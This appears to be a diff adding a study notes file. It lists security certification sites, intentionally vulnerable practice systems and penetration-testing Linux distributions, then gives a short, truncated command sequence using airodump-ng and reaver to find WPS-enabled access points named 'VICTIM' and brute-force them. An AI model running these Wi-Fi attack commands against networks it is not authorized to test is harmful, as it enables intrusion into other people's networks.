@@ -1,0 +1,48 @@
+www.offensive-security.com
+eccouncil.org
+sans.org/online
+giac.org
+
+ccna cyberops
+learningnetwork.cisco.com
+isc2.org
+
+
+
+virtual internet routing lab (virl)
+
+vulnerable operating system
+
+metasploitable
+
+vulnub.com
+
+vulnerable web application
+
+hackthissite.org
+webgoat-https://github.com/webgoat/webgoat
+nvd.nist.gov/vuln/search
+
+
+www.parrotsec.org
+https://backbox.org/download
+www.pentoo.ch/download/
+www.deftlinux.net/download
+www.caine-live.net
+https://www.kali.org/downloads/
+
+
+
+
+
+
+
+apt-get update
+
+apt-get install reaver aircrack-ng
+
+airmon-ng check
+
+airodump-ng wlan0mon --wps --essid-regex VICTIM
+
+reaver -i wlan0mon -c 11 
